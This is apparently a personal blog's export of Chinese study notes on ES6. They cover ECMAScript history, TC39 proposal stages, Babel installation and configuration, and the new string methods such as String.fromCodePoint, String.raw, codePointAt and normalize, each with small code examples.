<h4 id="1-1-ECMAScript-和-JavaScript-的关系"><a href="#1-1-ECMAScript-和-JavaScript-的关系" class="headerlink" title="1.1 ECMAScript 和 JavaScript 的关系"></a>1.1 ECMAScript 和 JavaScript 的关系</h4><p>一个常见的问题是，ECMAScript 和 JavaScript 到底是什么关系？</p>
<p>要讲清楚这个问题，需要回顾历史。1996 年 11 月，JavaScript 的创造者 Netscape 公司，决定将 JavaScript 提交给标准化组织 ECMA，希望这种语言能够成为国际标准。次年，ECMA 发布 262 号标准文件（ECMA-262）的第一版，规定了浏览器脚本语言的标准，并将这种语言称为 ECMAScript，这个版本就是 1.0 版。</p>
<p>该标准从一开始就是针对 JavaScript 语言制定的，但是之所以不叫 JavaScript，有两个原因。一是商标，Java 是 Sun 公司的商标，根据授权协议，只有 Netscape 公司可以合法地使用 JavaScript 这个名字，且 JavaScript 本身也已经被 Netscape 公司注册为商标。二是想体现这门语言的制定者是 ECMA，不是 Netscape，这样有利于保证这门语言的开放性和中立性。</p>
<p>因此，ECMAScript 和 JavaScript 的关系是，前者是后者的规格，后者是前者的一种实现（另外的 ECMAScript 方言还有 JScript 和 ActionScript）。日常场合，这两个词是可以互换的。</p>
<span id="more"></span>
<h4 id="1-2-ES6-与-ECMAScript-2015-的关系"><a href="#1-2-ES6-与-ECMAScript-2015-的关系" class="headerlink" title="1.2 ES6 与 ECMAScript 2015 的关系"></a>1.2 ES6 与 ECMAScript 2015 的关系</h4><p>ECMAScript 2015（简称 ES2015）这个词，也是经常可以看到的。它与 ES6 是什么关系呢？</p>
<p>2011 年，ECMAScript 5.1 版发布后，就开始制定 6.0 版了。因此，ES6 这个词的原意，就是指 JavaScript 语言的下一个版本。</p>
<p>但是，因为这个版本引入的语法功能太多，而且制定过程当中，还有很多组织和个人不断提交新功能。事情很快就变得清楚了，不可能在一个版本里面包括所有将要引入的功能。常规的做法是先发布 6.0 版，过一段时间再发 6.1 版，然后是 6.2 版、6.3 版等等。</p>
<p>但是，标准的制定者不想这样做。他们想让标准的升级成为常规流程：任何人在任何时候，都可以向标准委员会提交新语法的提案，然后标准委员会每个月开一次会，评估这些提案是否可以接受，需要哪些改进。如果经过多次会议以后，一个提案足够成熟了，就可以正式进入标准了。这就是说，标准的版本升级成为了一个不断滚动的流程，每个月都会有变动。</p>
<p>标准委员会最终决定，标准在每年的 6 月份正式发布一次，作为当年的正式版本。接下来的时间，就在这个版本的基础上做改动，直到下一年的 6 月份，草案就自然变成了新一年的版本。这样一来，就不需要以前的版本号了，只要用年份标记就可以了。</p>
<p>ES6 的第一个版本，就这样在 2015 年 6 月发布了，正式名称就是《ECMAScript 2015 标准》（简称 ES2015）。2016 年 6 月，小幅修订的《ECMAScript 2016 标准》（简称 ES2016）如期发布，这个版本可以看作是 ES6.1 版，因为两者的差异非常小（只新增了数组实例的<code>includes</code>方法和指数运算符），基本上是同一个标准。根据计划，2017 年 6 月发布 ES2017 标准。</p>
<p>因此，ES6 既是一个历史名词，也是一个泛指，含义是 5.1 版以后的 JavaScript 的下一代标准，涵盖了 ES2015、ES2016、ES2017 等等，而 ES2015 则是正式名称，特指该年发布的正式版本的语言标准。本书中提到 ES6 的地方，一般是指 ES2015 标准，但有时也是泛指“下一代 JavaScript 语言”。</p>
<h4 id="1-3-语法提案的批准流程"><a href="#1-3-语法提案的批准流程" class="headerlink" title="1.3 语法提案的批准流程"></a>1.3 语法提案的批准流程</h4><p>任何人都可以向标准委员会（又称 TC39 委员会）提案，要求修改语言标准。</p>
<p>一种新的语法从提案到变成正式标准，需要经历五个阶段。每个阶段的变动都需要由 TC39 委员会批准。</p>
<ul>
<li>Stage 0 - Strawman（展示阶段）</li>
<li>Stage 1 - Proposal（征求意见阶段）</li>
<li>Stage 2 - Draft（草案阶段）</li>
<li>Stage 3 - Candidate（候选人阶段）</li>
<li>Stage 4 - Finished（定案阶段）</li>
</ul>
<p>一个提案只要能进入 Stage 2，就差不多肯定会包括在以后的正式标准里面。ECMAScript 当前的所有提案，可以在 TC39 的官方网站GitHub.com/tc39/ecma262查看。</p>
<p>本书的写作目标之一，是跟踪 ECMAScript 语言的最新进展，介绍 5.1 版本以后所有的新语法。对于那些明确或很有希望，将要列入标准的新语法，都将予以介绍。</p>
<h4 id="1-4-ECMAScript-的历史"><a href="#1-4-ECMAScript-的历史" class="headerlink" title="1.4 ECMAScript 的历史"></a>1.4 ECMAScript 的历史</h4><p>ES6 从开始制定到最后发布，整整用了 15 年。</p>
<p>前面提到，ECMAScript 1.0 是 1997 年发布的，接下来的两年，连续发布了 ECMAScript 2.0（1998 年 6 月）和 ECMAScript 3.0（1999 年 12 月）。3.0 版是一个巨大的成功，在业界得到广泛支持，成为通行标准，奠定了 JavaScript 语言的基本语法，以后的版本完全继承。直到今天，初学者一开始学习 JavaScript，其实就是在学 3.0 版的语法。</p>
<p>2000 年，ECMAScript 4.0 开始酝酿。这个版本最后没有通过，但是它的大部分内容被 ES6 继承了。因此，ES6 制定的起点其实是 2000 年。</p>
<p>为什么 ES4 没有通过呢？因为这个版本太激进了，对 ES3 做了彻底升级，导致标准委员会的一些成员不愿意接受。ECMA 的第 39 号技术专家委员会（Technical Committee 39，简称 TC39）负责制订 ECMAScript 标准，成员包括 Microsoft、Mozilla、Google 等大公司。</p>
<p>2007 年 10 月，ECMAScript 4.0 版草案发布，本来预计次年 8 月发布正式版本。但是，各方对于是否通过这个标准，发生了严重分歧。以 Yahoo、Microsoft、Google 为首的大公司，反对 JavaScript 的大幅升级，主张小幅改动；以 JavaScript 创造者 Brendan Eich 为首的 Mozilla 公司，则坚持当前的草案。</p>
<p>2008 年 7 月，由于对于下一个版本应该包括哪些功能，各方分歧太大，争论过于激烈，ECMA 开会决定，中止 ECMAScript 4.0 的开发，将其中涉及现有功能改善的一小部分，发布为 ECMAScript 3.1，而将其他激进的设想扩大范围，放入以后的版本，由于会议的气氛，该版本的项目代号起名为 Harmony（和谐）。会后不久，ECMAScript 3.1 就改名为 ECMAScript 5。</p>
<p>2009 年 12 月，ECMAScript 5.0 版正式发布。Harmony 项目则一分为二，一些较为可行的设想定名为 JavaScript.next 继续开发，后来演变成 ECMAScript 6；一些不是很成熟的设想，则被视为 JavaScript.next.next，在更远的将来再考虑推出。TC39 委员会的总体考虑是，ES5 与 ES3 基本保持兼容，较大的语法修正和新功能加入，将由 JavaScript.next 完成。当时，JavaScript.next 指的是 ES6，第六版发布以后，就指 ES7。TC39 的判断是，ES5 会在 2013 年的年中成为 JavaScript 开发的主流标准，并在此后五年中一直保持这个位置。</p>
<p>2011 年 6 月，ECMAScript 5.1 版发布，并且成为 ISO 国际标准（ISO/IEC 16262:2011）。</p>
<p>2013 年 3 月，ECMAScript 6 草案冻结，不再添加新功能。新的功能设想将被放到 ECMAScript 7。</p>
<p>2013 年 12 月，ECMAScript 6 草案发布。然后是 12 个月的讨论期，听取各方反馈。</p>
<p>2015 年 6 月，ECMAScript 6 正式通过，成为国际标准。从 2000 年算起，这时已经过去了 15 年。</p>
<p>目前，各大浏览器对 ES6 的支持可以查看kangax.github.io/compat-table/es6/。</p>
<p>Node.js 是 JavaScript 的服务器运行环境（runtime）。它对 ES6 的支持度更高。除了那些默认打开的功能，还有一些语法功能已经实现了，但是默认没有打开。使用下面的命令，可以查看 Node.js 默认没有打开的 ES6 实验性语法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Linux &amp; Mac</span></span><br><span class="line">$ node --v8-options | grep harmony</span><br><span class="line"></span><br><span class="line"><span class="comment">// Windows</span></span><br><span class="line">$ node --v8-options | findstr harmony</span><br></pre></td></tr></table></figure>

<h4 id="1-5-Babel-转码器"><a href="#1-5-Babel-转码器" class="headerlink" title="1.5 Babel 转码器"></a>1.5 Babel 转码器</h4><p>Babel 是一个广泛使用的 ES6 转码器，可以将 ES6 代码转为 ES5 代码，从而在老版本的浏览器执行。这意味着，你可以用 ES6 的方式编写程序，又不用担心现有环境是否支持。下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 转码前</span></span><br><span class="line">input.map(<span class="function"><span class="params">item</span> =&gt;</span> item + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转码后</span></span><br><span class="line">input.map(<span class="function"><span class="keyword">function</span> (<span class="params">item</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> item + <span class="number">1</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>上面的原始代码用了箭头函数，Babel 将其转为普通函数，就能在不支持箭头函数的 JavaScript 环境执行了。</p>
<p>下面的命令在项目目录中，安装 Babel。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$ npm install --save-dev @babel/core</span><br></pre></td></tr></table></figure>

<h5 id="1-5-1-配置文件-babelrc"><a href="#1-5-1-配置文件-babelrc" class="headerlink" title="1.5.1 配置文件.babelrc"></a>1.5.1 配置文件.babelrc</h5><p>Babel 的配置文件是<code>.babelrc</code>，存放在项目的根目录下。使用 Babel 的第一步，就是配置这个文件。</p>
<p>该文件用来设置转码规则和插件，基本格式如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;presets&quot;</span>: [],</span><br><span class="line">  <span class="string">&quot;plugins&quot;</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>presets</code>字段设定转码规则，官方提供以下的规则集，你可以根据需要安装。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"># 最新转码规则</span><br><span class="line">$ npm install --save-dev @babel/preset-env</span><br><span class="line"></span><br><span class="line"># react 转码规则</span><br><span class="line">$ npm install --save-dev @babel/preset-react</span><br></pre></td></tr></table></figure>
<p>然后，将这些规则加入<code>.babelrc</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="string">&quot;presets&quot;</span>: [</span><br><span class="line">     <span class="string">&quot;@babel/env&quot;</span>,</span><br><span class="line">     <span class="string">&quot;@babel/preset-react&quot;</span></span><br><span class="line">   ],</span><br><span class="line">   <span class="string">&quot;plugins&quot;</span>: []</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>注意，以下所有 Babel 工具和模块的使用，都必须先写好<code>.babelrc</code>。</p>
<h5 id="1-5-2-命令行转码"><a href="#1-5-2-命令行转码" class="headerlink" title="1.5.2 命令行转码"></a>1.5.2 命令行转码</h5><p>Babel 提供命令行工具<code>@babel/cli</code>，用于命令行转码。</p>
<p>它的安装命令如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$ npm install --save-dev @babel/cli</span><br></pre></td></tr></table></figure>
<p>基本用法如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"># 转码结果输出到标准输出</span><br><span class="line">$ npx babel example.js</span><br><span class="line"></span><br><span class="line"># 转码结果写入一个文件</span><br><span class="line"># --out-file 或 -o 参数指定输出文件</span><br><span class="line">$ npx babel example.js --out-file compiled.js</span><br><span class="line"># 或者</span><br><span class="line">$ npx babel example.js -o compiled.js</span><br><span class="line"></span><br><span class="line"># 整个目录转码</span><br><span class="line"># --out-dir 或 -d 参数指定输出目录</span><br><span class="line">$ npx babel src --out-dir lib</span><br><span class="line"># 或者</span><br><span class="line">$ npx babel src -d lib</span><br><span class="line"></span><br><span class="line"># -s 参数生成source map文件</span><br><span class="line">$ npx babel src -d lib -s</span><br></pre></td></tr></table></figure>
<h5 id="1-5-3-babel-node"><a href="#1-5-3-babel-node" class="headerlink" title="1.5.3 babel-node"></a>1.5.3 babel-node</h5><p><code>@babel/node</code>模块的<code>babel-node</code>命令，提供一个支持 ES6 的 REPL 环境。它支持 Node 的 REPL 环境的所有功能，而且可以直接运行 ES6 代码。</p>
<p>首先，安装这个模块。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$ npm install --save-dev @babel/node</span><br></pre></td></tr></table></figure>
<p>然后，执行<code>babel-node</code>就进入 REPL 环境。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$ npx babel-node</span><br><span class="line">&gt; (<span class="function"><span class="params">x</span> =&gt;</span> x * <span class="number">2</span>)(<span class="number">1</span>)</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>
<p><code>babel-node</code>命令可以直接运行 ES6 脚本。将上面的代码放入脚本文件es6.js，然后直接运行。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"># es6.js 的代码</span><br><span class="line"># console.log((x =&gt; x * 2)(1));</span><br><span class="line">$ npx babel-node es6.js</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>
<h5 id="1-5-4-babel-register-模块"><a href="#1-5-4-babel-register-模块" class="headerlink" title="1.5.4 @babel/register 模块"></a>1.5.4 @babel/register 模块</h5><p><code>@babel/register</code>模块改写<code>require</code>命令，为它加上一个钩子。此后，每当使用<code>require</code>加载<code>.js</code>、<code>.jsx</code>、<code>.es</code>和<code>.es6</code>后缀名的文件，就会先用 Babel 进行转码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$ npm install --save-dev @babel/register</span><br></pre></td></tr></table></figure>
<p>使用时，必须首先加载<code>@babel/register</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;@babel/register&#x27;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;./es6.js&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>然后，就不需要手动对<code>index.js</code>转码了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$ node index.js</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>需要注意的是，<code>@babel/register</code>只会对<code>require</code>命令加载的文件转码，而不会对当前文件转码。另外，由于它是实时转码，所以只适合在开发环境使用。</p>
<h5 id="1-5-5-polyfill"><a href="#1-5-5-polyfill" class="headerlink" title="1.5.5 polyfill"></a>1.5.5 polyfill</h5><p>Babel 默认只转换新的 JavaScript 句法（syntax），而不转换新的 API，比如<code>Iterator</code>、<code>Generator</code>、<code>Set</code>、<code>Map</code>、<code>Proxy</code>、<code>Reflect</code>、<code>Symbol</code>、<code>Promise</code>等全局对象，以及一些定义在全局对象上的方法（比如<code>Object.assign</code>）都不会转码。</p>
<p>举例来说，ES6 在<code>Array</code>对象上新增了<code>Array.from</code>方法。Babel 就不会转码这个方法。如果想让这个方法运行，可以使用<code>core-js</code>和<code>regenerator-runtime</code>(后者提供generator函数的转码)，为当前环境提供一个垫片。</p>
<p>安装命令如下。 </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$ npm install --save-dev core-js regenerator-runtime</span><br></pre></td></tr></table></figure>
<p>然后，在脚本头部，加入如下两行代码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;core-js&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;regenerator-runtime/runtime&#x27;</span>;</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;core-js&#x27;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;regenerator-runtime/runtime);</span></span><br></pre></td></tr></table></figure>
<p>Babel 默认不转码的 API 非常多，详细清单可以查看<code>babel-plugin-transform-runtime</code>模块的<code>definitions.js</code>文件。</p>
<h5 id="1-5-6-浏览器环境"><a href="#1-5-6-浏览器环境" class="headerlink" title="1.5.6 浏览器环境"></a>1.5.6 浏览器环境</h5><p>Babel 也可以用于浏览器环境，使用<code>@babel/standalone</code>模块提供的浏览器版本，将其插入网页。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;https://unpkg.com/@babel/standalone/babel.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/babel&quot;</span>&gt;</span><br><span class="line"><span class="comment">// Your ES6 code</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>注意，网页实时将 ES6 代码转为 ES5，对性能会有影响。生产环境需要加载已经转码完成的脚本。</p>
<p>Babel 提供一个REPL 在线编译器，可以在线将 ES6 代码转为 ES5 代码。转换后的代码，可以直接作为 ES5 代码插入网页运行。</p>
]]></content>
      <categories>
        <category>JS-ES6</category>
      </categories>
      <tags>
        <tag>JS-ES6 ECMAScript 6 简介</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0075</title>
    <url>/2021/06/18/%E6%89%93%E5%8D%A10075/</url>
    <content><![CDATA[<p><font color=#ef5b9c>世界上最重的木头会浮出水面吗？</font></p>
<h2 id="ES6"><a href="#ES6" class="headerlink" title="ES6"></a>ES6</h2><h3 id="5-字符串的新增方法"><a href="#5-字符串的新增方法" class="headerlink" title="5. 字符串的新增方法"></a>5. 字符串的新增方法</h3><h4 id="5-1-String-fromCodePoint"><a href="#5-1-String-fromCodePoint" class="headerlink" title="5.1 String.fromCodePoint()"></a>5.1 String.fromCodePoint()</h4><p>ES5 提供<code>String.fromCharCode()</code>方法，用于从 Unicode 码点返回对应字符，但是这个方法不能识别码点大于<code>0xFFFF</code>的字符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span>.fromCharCode(<span class="number">0x20BB7</span>)</span><br><span class="line"><span class="comment">// &quot;ஷ&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>String.fromCharCode()</code>不能识别大于<code>0xFFFF</code>的码点，所以<code>0x20BB7</code>就发生了溢出，最高位<code>2</code>被舍弃了，最后返回码点<code>U+0BB7</code>对应的字符，而不是码点<code>U+20BB7</code>对应的字符。</p>
<p>ES6 提供了<code>String.fromCodePoint()</code>方法，可以识别大于<code>0xFFFF</code>的字符，弥补了<code>String.fromCharCode()</code>方法的不足。在作用上，正好与下面的<code>codePointAt()</code>方法相反。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span>.fromCodePoint(<span class="number">0x20BB7</span>)</span><br><span class="line"><span class="comment">// &quot;𠮷&quot;</span></span><br><span class="line"><span class="built_in">String</span>.fromCodePoint(<span class="number">0x78</span>, <span class="number">0x1f680</span>, <span class="number">0x79</span>) === <span class="string">&#x27;x\uD83D\uDE80y&#x27;</span></span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，如果<code>String.fromCodePoint</code>方法有多个参数，则它们会被合并成一个字符串返回。</p>
<p>注意，<code>fromCodePoint</code>方法定义在<code>String</code>对象上，而<code>codePointAt</code>方法定义在字符串的实例对象上。<span id="more"></span></p>
<h4 id="5-2-String-raw"><a href="#5-2-String-raw" class="headerlink" title="5.2 String.raw()"></a>5.2 String.raw()</h4><p>ES6 还为原生的 String 对象，提供了一个<code>raw()</code>方法。该方法返回一个斜杠都被转义（即斜杠前面再加一个斜杠）的字符串，往往用于模板字符串的处理方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span>.raw<span class="string">`Hi\n<span class="subst">$&#123;<span class="number">2</span>+<span class="number">3</span>&#125;</span>!`</span></span><br><span class="line"><span class="comment">// 实际返回 &quot;Hi\\n5!&quot;，显示的是转义后的结果 &quot;Hi\n5!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">String</span>.raw<span class="string">`Hi\u000A!`</span>;</span><br><span class="line"><span class="comment">// 实际返回 &quot;Hi\\u000A!&quot;，显示的是转义后的结果 &quot;Hi\u000A!&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果原字符串的斜杠已经转义，那么<code>String.raw()</code>会进行再次转义。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span>.raw<span class="string">`Hi\\n`</span></span><br><span class="line"><span class="comment">// 返回 &quot;Hi\\\\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">String</span>.raw<span class="string">`Hi\\n`</span> === <span class="string">&quot;Hi\\\\n&quot;</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p><code>String.raw()</code>方法可以作为处理模板字符串的基本方法，它会将所有变量替换，而且对斜杠进行转义，方便下一步作为字符串来使用。</p>
<p><code>String.raw()</code>本质上是一个正常的函数，只是专用于模板字符串的标签函数。如果写成正常函数的形式，它的第一个参数，应该是一个具有<code>raw</code>属性的对象，且<code>raw</code>属性的值应该是一个数组，对应模板字符串解析后的值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// `foo$&#123;1 + 2&#125;bar`</span></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="built_in">String</span>.raw(&#123; <span class="attr">raw</span>: [<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>] &#125;, <span class="number">1</span> + <span class="number">2</span>) <span class="comment">// &quot;foo3bar&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>String.raw()</code>方法的第一个参数是一个对象，它的<code>raw</code>属性等同于原始的模板字符串解析后得到的数组。</p>
<p>作为函数，<code>String.raw()</code>的代码实现基本如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span>.raw = <span class="function"><span class="keyword">function</span> (<span class="params">strings, ...values</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> output = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">let</span> index;</span><br><span class="line">  <span class="keyword">for</span> (index = <span class="number">0</span>; index &lt; values.length; index++) &#123;</span><br><span class="line">    output += strings.raw[index] + values[index];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  output += strings.raw[index]</span><br><span class="line">  <span class="keyword">return</span> output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="5-3-实例方法：codePointAt"><a href="#5-3-实例方法：codePointAt" class="headerlink" title="5.3 实例方法：codePointAt()"></a>5.3 实例方法：codePointAt()</h4><p>JavaScript 内部，字符以 UTF-16 的格式储存，每个字符固定为<code>2</code>个字节。对于那些需要<code>4</code>个字节储存的字符（Unicode 码点大于<code>0xFFFF</code>的字符），JavaScript 会认为它们是两个字符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&quot;𠮷&quot;</span>;</span><br><span class="line"></span><br><span class="line">s.length <span class="comment">// 2</span></span><br><span class="line">s.charAt(<span class="number">0</span>) <span class="comment">// &#x27;&#x27;</span></span><br><span class="line">s.charAt(<span class="number">1</span>) <span class="comment">// &#x27;&#x27;</span></span><br><span class="line">s.charCodeAt(<span class="number">0</span>) <span class="comment">// 55362</span></span><br><span class="line">s.charCodeAt(<span class="number">1</span>) <span class="comment">// 57271</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，汉字“𠮷”（注意，这个字不是“吉祥”的“吉”）的码点是<code>0x20BB7</code>，UTF-16 编码为<code>0xD842</code> <code>0xDFB7</code>（十进制为55362 57271），需要<code>4</code>个字节储存。对于这种<code>4</code>个字节的字符，JavaScript 不能正确处理，字符串长度会误判为<code>2</code>，而且<code>charAt()</code>方法无法读取整个字符，<code>charCodeAt()</code>方法只能分别返回前两个字节和后两个字节的值。</p>
<p>ES6 提供了<code>codePointAt()</code>方法，能够正确处理 4 个字节储存的字符，返回一个字符的码点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s = <span class="string">&#x27;𠮷a&#x27;</span>;</span><br><span class="line"></span><br><span class="line">s.codePointAt(<span class="number">0</span>) <span class="comment">// 134071</span></span><br><span class="line">s.codePointAt(<span class="number">1</span>) <span class="comment">// 57271</span></span><br><span class="line"></span><br><span class="line">s.codePointAt(<span class="number">2</span>) <span class="comment">// 97</span></span><br></pre></td></tr></table></figure>
<p><code>codePointAt()</code>方法的参数，是字符在字符串中的位置（从 0 开始）。上面代码中，JavaScript 将“𠮷a”视为三个字符，codePointAt 方法在第一个字符上，正确地识别了“𠮷”，返回了它的十进制码点 134071（即十六进制的20BB7）。在第二个字符（即“𠮷”的后两个字节）和第三个字符“a”上，<code>codePointAt()</code>方法的结果与<code>charCodeAt()</code>方法相同。</p>
<p>总之，<code>codePointAt()</code>方法会正确返回 32 位的 UTF-16 字符的码点。对于那些两个字节储存的常规字符，它的返回结果与<code>charCodeAt()</code>方法相同。</p>
<p><code>codePointAt()</code>方法返回的是码点的十进制值，如果想要十六进制的值，可以使用<code>toString()</code>方法转换一下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s = <span class="string">&#x27;𠮷a&#x27;</span>;</span><br><span class="line"></span><br><span class="line">s.codePointAt(<span class="number">0</span>).toString(<span class="number">16</span>) <span class="comment">// &quot;20bb7&quot;</span></span><br><span class="line">s.codePointAt(<span class="number">2</span>).toString(<span class="number">16</span>) <span class="comment">// &quot;61&quot;</span></span><br></pre></td></tr></table></figure>
<p>你可能注意到了，<code>codePointAt()</code>方法的参数，仍然是不正确的。比如，上面代码中，字符<code>a</code>在字符串<code>s</code>的正确位置序号应该是 1，但是必须向<code>codePointAt()</code>方法传入 2。解决这个问题的一个办法是使用<code>for...of</code>循环，因为它会正确识别 32 位的 UTF-16 字符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s = <span class="string">&#x27;𠮷a&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> ch <span class="keyword">of</span> s) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(ch.codePointAt(<span class="number">0</span>).toString(<span class="number">16</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 20bb7</span></span><br><span class="line"><span class="comment">// 61</span></span><br></pre></td></tr></table></figure>
<p>另一种方法也可以，使用扩展运算符（<code>...</code>）进行展开运算。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [...<span class="string">&#x27;𠮷a&#x27;</span>]; <span class="comment">// arr.length === 2</span></span><br><span class="line">arr.forEach(</span><br><span class="line">  ch =&gt; <span class="built_in">console</span>.log(ch.codePointAt(<span class="number">0</span>).toString(<span class="number">16</span>))</span><br><span class="line">);</span><br><span class="line"><span class="comment">// 20bb7</span></span><br><span class="line"><span class="comment">// 61</span></span><br></pre></td></tr></table></figure>
<p><code>codePointAt()</code>方法是测试一个字符由两个字节还是由四个字节组成的最简单方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is32Bit</span>(<span class="params">c</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> c.codePointAt(<span class="number">0</span>) &gt; <span class="number">0xFFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">is32Bit(<span class="string">&quot;𠮷&quot;</span>) <span class="comment">// true</span></span><br><span class="line">is32Bit(<span class="string">&quot;a&quot;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h4 id="5-4-实例方法：normalize"><a href="#5-4-实例方法：normalize" class="headerlink" title="5.4 实例方法：normalize()"></a>5.4 实例方法：normalize()</h4><p>许多欧洲语言有语调符号和重音符号。为了表示它们，Unicode 提供了两种方法。一种是直接提供带重音符号的字符，比如<code>Ǒ</code>（\u01D1）。另一种是提供合成符号（combining character），即原字符与重音符号的合成，两个字符合成一个字符，比如<code>O</code>（\u004F）和<code>ˇ</code>（\u030C）合成<code>Ǒ</code>（\u004F\u030C）。</p>
<p>这两种表示方法，在视觉和语义上都等价，但是 JavaScript 不能识别。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;\u01D1&#x27;</span>===<span class="string">&#x27;\u004F\u030C&#x27;</span> <span class="comment">//false</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;\u01D1&#x27;</span>.length <span class="comment">// 1</span></span><br><span class="line"><span class="string">&#x27;\u004F\u030C&#x27;</span>.length <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>上面代码表示，JavaScript 将合成字符视为两个字符，导致两种表示方法不相等。</p>
<p>ES6 提供字符串实例的<code>normalize()</code>方法，用来将字符的不同表示方法统一为同样的形式，这称为 Unicode 正规化。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;\u01D1&#x27;</span>.normalize() === <span class="string">&#x27;\u004F\u030C&#x27;</span>.normalize()</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p><code>normalize</code>方法可以接受一个参数来指定<code>normalize</code>的方式，参数的四个可选值如下。</p>
<ul>
<li><code>NFC</code>，默认参数，表示“标准等价合成”（Normalization Form Canonical Composition），返回多个简单字符的合成字符。所谓“标准等价”指的是视觉和语义上的等价。</li>
<li><code>NFD</code>，表示“标准等价分解”（Normalization Form Canonical Decomposition），即在标准等价的前提下，返回合成字符分解的多个简单字符。</li>
<li><code>NFKC</code>，表示“兼容等价合成”（Normalization Form Compatibility Composition），返回合成字符。所谓“兼容等价”指的是语义上存在等价，但视觉上不等价，比如“囍”和“喜喜”。（这只是用来举例，normalize方法不能识别中文。）</li>
<li><code>NFKD</code>，表示“兼容等价分解”（Normalization Form Compatibility Decomposition），即在兼容等价的前提下，返回合成字符分解的多个简单字符。</li>
</ul>
